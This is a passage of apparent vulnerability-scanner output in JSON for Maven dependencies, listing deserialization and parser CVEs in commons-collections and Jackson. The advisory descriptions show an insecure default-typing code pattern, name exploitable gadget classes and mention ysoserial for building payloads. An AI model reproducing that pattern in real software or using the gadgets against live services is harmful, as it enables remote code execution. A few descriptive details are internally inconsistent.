[
  {
    "scan_id": "04131bdf-69d8-4347-5883-d543b47d1917",
    "vulnerabilities": [
      {
        "cves": [
          {
            "cve": "CVE-2015-6420",
            "cvss_v2_score": "7.5",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "Serialized-object interfaces in certain Cisco Collaboration and Social Media; Endpoint Clients and Client Software; Network Application, Service, and Acceleration; Network and Content Security Devices; Network Management and Provisioning; Routing and Switching - Enterprise and Service Provider; Unified Computing; Voice and Unified Communications Devices; Video, Streaming, TelePresence, and Transcoding Devices; Wireless; and Cisco Hosted Services products allow remote attackers to execute arbitrary commands via a crafted serialized Java object, related to the Apache Commons Collections (ACC) library.",
        "severity": "High",
        "components": {
          "gav://commons-collections:commons-collections:3.2.1": {
            "fixed_versions": [
              "[3.2.2]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://commons-collections:commons-collections:3.2.1"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-55787",
        "references": [
          "https://www.kb.cert.org/vuls/id/576313",
          "https://news.apache.org/foundation/entry/apache_commons_statement_to_widespread",
          "https://lists.apache.org/thread.html/r352e40ca9874d1beb4ad95403792adca7eb295e6bc3bd7b65fabcc21@%3Ccommits.samza.apache.org%3E",
          "https://foxglovesecurity.com/2015/11/06/what-do-weblogic-websphere-jboss-jenkins-opennms-and-your-application-have-in-common-this-vulnerability/",
          "https://www.tenable.com/security/research/tra-2017-23",
          "https://arxiv.org/pdf/2306.05534",
          "http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html",
          "https://www.tenable.com/security/research/tra-2017-14",
          "http://www.securityfocus.com/bid/78872",
          "https://nvd.nist.gov/vuln/detail/CVE-2015-6420",
          "https://h20566.www2.hpe.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c05376917",
          "https://lists.apache.org/thread.html/r352e40ca9874d1beb4ad95403792adca7eb295e6bc3bd7b65fabcc21%40%3Ccommits.samza.apache.org%3E",
          "https://h20566.www2.hpe.com/portal/site/hpsc/public/kb/docDisplay?docId=emr_na-c05390722",
          "https://github.com/apache/commons-collections",
          "https://www.kb.cert.org/vuls/id/581311",
          "http://tools.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-20151209-java-deserialization"
        ]
      }
    ],
    "component_id": "gav://commons-collections:commons-collections:3.2.1",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "a8d6e27d-1b3e-4110-4981-896cf4d6c0bb",
    "component_id": "gav://com.fasterxml.jackson.core:jackson-annotations:2.13.4",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "0c042c7a-c301-46d6-411c-14e41b4bb7f6",
    "vulnerabilities": [
      {
        "cves": [
          {
            "cve": "CVE-2025-52999",
            "cwe": [
              "CWE-121"
            ],
            "cwe_details": {
              "CWE-121": {
                "name": "Stack-based Buffer Overflow",
                "description": "A stack-based buffer overflow condition is a condition where the buffer being overwritten is allocated on the stack (i.e., is a local variable or, rarely, a parameter to a function)."
              }
            }
          }
        ],
        "summary": "jackson-core contains core low-level incremental (\"streaming\") parser and generator abstractions used by Jackson Data Processor. In versions prior to 2.15.0, if a user parses an input file and it has deeply nested data, Jackson could end up throwing a StackoverflowError if the depth is particularly large. jackson-core 2.15.0 contains a configurable limit for how deep Jackson will traverse in an input document, defaulting to an allowable depth of 1000. jackson-core will throw a StreamConstraintsException if the limit is reached. jackson-databind also benefits from this change because it uses jackson-core to parse JSON inputs. As a workaround, users should avoid parsing input files from untrusted sources.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-core:2.13.4": {
            "fixed_versions": [
              "[2.15.0]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-core:2.13.4"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-707194",
        "references": [
          "https://nvd.nist.gov/vuln/detail/CVE-2025-52999",
          "https://github.com/FasterXML/jackson-core/pull/943",
          "https://github.com/FasterXML/jackson-core/security/advisories/GHSA-h46c-h94j-95f3",
          "https://github.com/advisories/GHSA-h46c-h94j-95f3"
        ]
      }
    ],
    "component_id": "gav://com.fasterxml.jackson.core:jackson-core:2.13.4",
    "package_type": "maven",
    "status": "completed"
  },
  {
    "scan_id": "df8f8edd-a1ec-4220-6175-0d470c848e48",
    "vulnerabilities": [
      {
        "cves": [
          {
            "cve": "CVE-2019-16942",
            "cvss_v2_score": "7.5",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:L/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "9.8",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "A Polymorphic Typing issue was discovered in FasterXML jackson-databind 2.0.0 through 2.9.10. When Default Typing is enabled (either globally or for a specific property) for an externally exposed JSON endpoint and the service has the commons-dbcp (1.4) jar in the classpath, and an attacker can find an RMI service endpoint to access, it is possible to make the service execute a malicious payload. This issue exists because of org.apache.commons.dbcp.datasources.SharedPoolDataSource and org.apache.commons.dbcp.datasources.PerUserPoolDataSource mishandling.",
        "severity": "Critical",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.10.1]",
              "[2.6.7.3]",
              "[2.7.9.7]",
              "[2.8.11.5]",
              "[2.9.10.1]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-89105",
        "references": [
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0%40%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2%40%3Cissues.geode.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujan2020.html",
          "https://lists.apache.org/thread.html/7782a937c9259a58337ee36b2961f00e2d744feafc13084e176d0df5@%3Cissues.geode.apache.org%3E",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://www.debian.org/security/2019/dsa-4542",
          "https://github.com/FasterXML/jackson-databind/commit/9593e16cf5a3d289a9c584f7123639655de9ddac",
          "https://www.oracle.com/security-alerts/cpuapr2020.html",
          "https://access.redhat.com/errata/RHSA-2020:0164",
          "https://github.com/FasterXML/jackson-databind/commit/bc67eb11a7cf57561f861ff16f879f1fceb5779f",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/TH5VFUN4P7CCIP7KSEXYA5MUTFCUDUJT/",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/Q7CANA7KV53JROZDX5Z5P26UG5VN2K43",
          "https://access.redhat.com/errata/RHSA-2020:0159",
          "https://github.com/advisories/GHSA-mx7p-6679-8g3q",
          "https://security.netapp.com/advisory/ntap-20191017-0006",
          "https://security.netapp.com/advisory/ntap-20191017-0006/",
          "https://github.com/FasterXML/jackson-databind/commit/54aa38d87dcffa5ccc23e64922e9536c82c1b9c8",
          "https://github.com/FasterXML/jackson-databind/issues/2478",
          "https://access.redhat.com/errata/RHSA-2020:0161",
          "https://lists.apache.org/thread.html/r1b103833cb5bc8466e24ff0ecc5e75b45a705334ab6a444e64e840a0@%3Cissues.bookkeeper.apache.org%3E",
          "https://lists.debian.org/debian-lts-announce/2019/10/msg00001.html",
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://nvd.nist.gov/vuln/detail/CVE-2019-16942",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442%40%3Cdev.drill.apache.org%3E",
          "https://issues.apache.org/jira/browse/GEODE-7255",
          "https://lists.apache.org/thread.html/b2e23c94f9dfef53e04c492e5d02e5c75201734be7adc73a49ef2370%40%3Cissues.geode.apache.org%3E",
          "https://www.oracle.com//security-alerts/cpujul2021.html",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f%40%3Cdev.drill.apache.org%3E",
          "https://github.com/FasterXML/jackson-databind/commit/328a0f833daf6baa443ac3b37c818a0204714b0b",
          "https://lists.apache.org/thread.html/7782a937c9259a58337ee36b2961f00e2d744feafc13084e176d0df5%40%3Cissues.geode.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2020:0160",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E",
          "https://seclists.org/bugtraq/2019/Oct/6",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc%40%3Cissues.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/b2e23c94f9dfef53e04c492e5d02e5c75201734be7adc73a49ef2370@%3Cissues.geode.apache.org%3E",
          "https://lists.apache.org/thread.html/a430dbc9be874c41314cc69e697384567a9a24025e819d9485547954%40%3Cissues.geode.apache.org%3E",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/TH5VFUN4P7CCIP7KSEXYA5MUTFCUDUJT",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2@%3Cissues.geode.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/a430dbc9be874c41314cc69e697384567a9a24025e819d9485547954@%3Cissues.geode.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2020:0445",
          "https://access.redhat.com/errata/RHSA-2019:3901",
          "https://www.oracle.com/security-alerts/cpuApr2021.html",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/Q7CANA7KV53JROZDX5Z5P26UG5VN2K43/"
        ],
        "extended_information": {
          "short_description": "A typing issue in commons-dbcp in Jackson-databind allows a remote attacker to perform code injection.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [commons-dbcp]( https://github.com/apache/commons-dbcp) gadget, an attacker can create an arbitrary JDBC connection by invoking ` org.apache.commons.dbcp.datasources.SharedPoolDataSource` or ` org.apache.commons.dbcp.datasources.PerUserPoolDataSource` , which allows for arbitrary SQL execution through the JDBC connection which further allows code injection, since the H2 JDBC driver allows defining and executing custom SQL aliases containing Java code. Additional information on this gadget can be found [here](https://blog.doyensec.com/2019/07/22/jackson-gadgets.html).\n\nWhen this library is included, an attacker can build a working exploit, and even automate this process by using [ysoserial]( https://github.com/frohoff/ysoserial), a tool that finds gadgets and create payloads for vulnerable java deserializers.\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes p6spy in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes `p6spy` in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `p6spy` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2018-12023",
            "cvss_v2_score": "5.1",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:H/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "7.5",
            "cvss_v3_vector": "CVSS:3.0/AV:N/AC:H/PR:N/UI:R/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "An issue was discovered in FasterXML jackson-databind prior to 2.7.9.4, 2.8.11.2, and 2.9.6. When Default Typing is enabled (either globally or for a specific property), the service has the Oracle JDBC jar in the classpath, and an attacker can provide an LDAP service to access, it is possible to make the service execute a malicious payload.",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.7.9.4]",
              "[2.8.11.2]",
              "[2.9.6]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-79230",
        "references": [
          "https://access.redhat.com/errata/RHSA-2019:0877",
          "https://access.redhat.com/errata/RHSA-2019:3002",
          "https://www.oracle.com/technetwork/security-advisory/cpuoct2018-4428296.html",
          "https://www.oracle.com/technetwork/security-advisory/cpujan2019-5072801.html",
          "https://access.redhat.com/errata/RHSA-2019:3140",
          "https://access.redhat.com/errata/RHSA-2019:1797",
          "https://www.oracle.com/technetwork/security-advisory/cpujul2019-5072835.html",
          "https://nvd.nist.gov/vuln/detail/CVE-2018-12023",
          "https://www.oracle.com/security-alerts/cpuapr2020.html",
          "https://access.redhat.com/errata/RHSA-2019:1108",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://lists.fedoraproject.org/archives/list/package-announce@lists.fedoraproject.org/message/ZEDLDUYBSTDY4GWDBUXGJNS2RFYTFVRC",
          "https://security.netapp.com/advisory/ntap-20190530-0003",
          "https://www.blackhat.com/docs/us-16/materials/us-16-Munoz-A-Journey-From-JNDI-LDAP-Manipulation-To-RCE.pdf",
          "https://security.netapp.com/advisory/ntap-20190530-0003/",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442@%3Cdev.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:1782",
          "https://seclists.org/bugtraq/2019/May/68",
          "https://access.redhat.com/errata/RHSA-2019:4037",
          "https://access.redhat.com/errata/RHSA-2019:3149",
          "https://github.com/FasterXML/jackson-databind/issues/2058",
          "https://access.redhat.com/errata/RHSA-2019:1107",
          "https://access.redhat.com/errata/RHSA-2019:3892",
          "https://www.debian.org/security/2019/dsa-4452",
          "https://github.com/FasterXML/jackson-databind/commit/28badf7ef60ac3e7ef151cd8e8ec010b8479226a",
          "https://lists.fedoraproject.org/archives/list/package-announce%40lists.fedoraproject.org/message/ZEDLDUYBSTDY4GWDBUXGJNS2RFYTFVRC/",
          "https://github.com/advisories/GHSA-6wqp-v4v6-c87c",
          "https://access.redhat.com/errata/RHSA-2019:2858",
          "https://access.redhat.com/errata/RHSA-2019:1822",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc@%3Cissues.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHSA-2019:1823",
          "https://access.redhat.com/errata/RHSA-2019:1140",
          "https://lists.apache.org/thread.html/f9bc3e55f4e28d1dcd1a69aae6d53e609a758e34d2869b4d798e13cc%40%3Cissues.drill.apache.org%3E",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://lists.apache.org/thread.html/7fcf88aff0d1deaa5c3c7be8d58c05ad7ad5da94b59065d8e7c50c5d@%3Cissues.lucene.apache.org%3E",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f%40%3Cdev.drill.apache.org%3E",
          "https://lists.apache.org/thread.html/519eb0fd45642dcecd9ff74cb3e71c20a4753f7d82e2f07864b5108f@%3Cdev.drill.apache.org%3E",
          "https://access.redhat.com/errata/RHBA-2019:0959",
          "https://github.com/FasterXML/jackson-databind/commit/bf261d404c2f79fd3406237710d40ebb03c99d84",
          "https://lists.apache.org/thread.html/b0656d359c7d40ec9f39c8cc61bca66802ef9a2a12ee199f5b0c1442%40%3Cdev.drill.apache.org%3E",
          "https://www.oracle.com/technetwork/security-advisory/cpuapr2019-5072813.html",
          "http://www.securityfocus.com/bid/105659",
          "https://github.com/FasterXML/jackson-databind/commit/7487cf7eb14be2f65a1eb108e8629c07ef45e0a",
          "https://access.redhat.com/errata/RHSA-2019:0782",
          "https://access.redhat.com/errata/RHSA-2019:2804",
          "https://access.redhat.com/errata/RHSA-2019:1106",
          "https://lists.apache.org/thread.html/7fcf88aff0d1deaa5c3c7be8d58c05ad7ad5da94b59065d8e7c50c5d%40%3Cissues.lucene.apache.org%3E"
        ],
        "extended_information": {
          "short_description": "A typing issue in multiple classes in Jackson-databind allows a remote attacker to perform remote code execution.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, the following classes were found to be able to cause remote code execution when used as Java gadgets -\n```\noracle.jdbc.connector.OracleManagedConnectionFactory\noracle.jdbc.rowset.OracleJDBCRowSet\n```\n\n\nExploitation requires:\n\n-\tDefault typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes one of the above classes in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "High",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\tDefault typing enabled for external JSON endpoints\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.\n-\tThe vulnerable Java service includes one of the following classes in its Java classpath\n```\noracle.jdbc.connector.OracleManagedConnectionFactory\noracle.jdbc.rowset.OracleJDBCRowSet\nl```",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
            "cve": "CVE-2020-11619",
            "cvss_v2_score": "6.8",
            "cvss_v2_vector": "CVSS:2.0/AV:N/AC:M/Au:N/C:P/I:P/A:P",
            "cvss_v3_score": "8.1",
            "cvss_v3_vector": "CVSS:3.1/AV:N/AC:H/PR:N/UI:N/S:U/C:H/I:H/A:H",
            "cwe": [
              "CWE-502"
            ],
            "cwe_details": {
              "CWE-502": {
                "name": "Deserialization of Untrusted Data",
                "description": "The product deserializes untrusted data without sufficiently verifying that the resulting data will be valid.",
                "categories": [
                  {
                    "category": "2023 CWE Top 25",
                    "rank": "15"
                  }
                ]
              }
            }
          }
        ],
        "summary": "FasterXML jackson-databind 2.x before 2.9.10.4 mishandles the interaction between serialization gadgets and typing, related to org.springframework.aop.config.MethodLocatingFactoryBean (aka spring-aop).",
        "severity": "High",
        "components": {
          "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5": {
            "fixed_versions": [
              "[2.6.7.4]",
              "[2.9.10.4]"
            ],
            "impact_paths": [
              [
                {
                  "component_id": "gav://com.fasterxml.jackson.core:jackson-databind:2.9.5"
                }
              ]
            ]
          }
        },
        "issue_id": "XRAY-96134",
        "references": [
          "https://github.com/FasterXML/jackson-databind/issues/2680",
          "https://www.oracle.com/security-alerts/cpujul2020.html",
          "https://www.oracle.com/security-alerts/cpuoct2020.html",
          "https://lists.debian.org/debian-lts-announce/2020/04/msg00012.html",
          "https://github.com/FasterXML/jackson-databind",
          "https://nvd.nist.gov/vuln/detail/CVE-2020-11619",
          "https://medium.com/@cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://security.netapp.com/advisory/ntap-20200511-0004",
          "https://www.oracle.com/security-alerts/cpujan2021.html",
          "https://medium.com/%40cowtowncoder/on-jackson-cves-dont-panic-here-is-what-you-need-to-know-54cd0d6e8062",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2%40%3Cissues.geode.apache.org%3E",
          "https://security.netapp.com/advisory/ntap-20200511-0004/",
          "https://lists.apache.org/thread.html/rf1bbc0ea4a9f014cf94df9a12a6477d24a27f52741dbc87f2fd52ff2@%3Cissues.geode.apache.org%3E"
        ],
        "extended_information": {
          "short_description": "A typing issue in spring-aop in Jackson-databind allows an attacker to perform SSRF.",
          "full_description": "[Jackson-databind]( https://github.com/FasterXML/jackson-databind) (previously known as \"jackson-mapper-asl\") is a streaming API library for Java. One of its components, `ObjectMapper` is responsible for serialization and deserialization of Java objects.\nJackson also supports deserialization of polymorphic types when `default typing` is enabled. This can be enabled by adding `@JsonTypeInfo(use = Id.CLASS) ` according to your function to determine its type or by calling `enableDefaultTyping()` on your `Objectmapper`..\nThis identifier allows the `ObjectMapper` to accept type identifiers and interpret them as an object like so:\n```\n{ \"phone\" : {\n \"@class\" : \"package.InternationalNumber\",\n \"areaCode\" : 555,\n ...\n }\n}\n```\n\n`ObjectMapper` can accept inputs from various of sources such as files, URL, JSON, web requests and many more, for example:\n```\n// Object from local JSON file\nPhone p = ObjectMapper.readValue(new File(\"phone.json\"), Phone.class);\nOr\n// Object from HTTP-hosted JSON file\nPhone p = ObjectMapper.readValue(new URL(\"https://www.somedomain.com/src/test/json_car.json\"), Phone.class);\n\n```\n\nSupport for polymorphic type deserialization allows an attacker to create almost any class at the server-side, assuming an attacker-supplied JSON file is deserialized. \nA vulnerable server-side handling of the serialized data may look like this:\n\n```\nObjectMapper mapper = new ObjectMapper();\nmapper.enableDefaultTyping()\nobj = mapper.readValue(jsonContent, java.lang.Object.java_class)\n```\n\nThe server-side creates the desired object by calling `mapper.readValue(…)` which will call all of its setters with the arguments supplied within the request.\n\nTo exploit this issue, an attacker has to find code modules or functions included in the Java classpath that aren’t [blacklisted](https://github.com/FasterXML/jackson-databind/blob/9593e16cf5a3d289a9c584f7123639655de9ddac/src/main/java/com/fasterxml/jackson/databind/jsontype/impl/SubTypeValidator.java) by Jackson-databind, that will allow the attacker to perform operations with some security impact (such as remote code injection) when chained together. These code modules are also known as [gadgets]( https://vickieli.dev/insecure%20deserialization/java-deserialization/).\n\nSpecifically, with the [spring-aop]( https://github.com/spring-projects/spring-framework) gadget, an attacker can manipulate inner variables in ` org.springframework.aop.config.MethodLocatingFactoryBean` and cause SSRF by invoking `setBeanFactory` and ` setMethodName`.\n\nWhen this library is included, an attacker can build a working exploit, and even automate this process by using [ysoserial]( https://github.com/frohoff/ysoserial), a tool that finds gadgets and create payloads for vulnerable java deserializers.\n\nExploitation requires:\n\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes spring-aop in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
          "jfrog_research_severity": "Medium",
          "jfrog_research_severity_reasons": [
            {
              "name": "The prerequisites for exploiting the issue are extremely unlikely",
              "description": "The exploitation prerequisites are unlikely:\n-\t Default typing enabled for external JSON endpoints\n-\tThe vulnerable java service includes spring-aop in its Java classpath\n-\tThe service has polymorphic type handling enabled\n-\tThe service deserializes objects with nominal type of `java.lang.Object`.",
              "is_positive": true
            },
            {
              "name": "The issue results in a severe impact (such as remote code execution)",
              "description": "This vulnerability leads to Remote Code Execution"
            },
            {
              "name": "Exploitation of the issue is only possible when the vulnerable component is used in a specific manner. The attacker has to perform per-target research to determine the vulnerable attack vector",
              "description": "The attacker must find remote input that propagates into an `ObjectMapper.readValue` call",
              "is_positive": true
            }
          ],
          "remediation": "##### Deployment mitigations\n\nRemove `spring-aop` from your Java classpath with the help of [this guide](https://docs.oracle.com/javase/tutorial/essential/environment/paths.html)\n\n##### Development mitigations\n\nAvoid using `java.lang.Object` as the deserialized object type. For example, a vulnerable usage would be - `obj = mapper.readValue(content, java.lang.Object.java_class)`. Instead - try to deserialize to the specific object type that you need, instead of `java.lang.Object`\n\n##### Development mitigations\n\nAvoid enabling default typing (`mapper.enableDefaultTyping()`)"
        }
      },
      {
        "cves": [
          {
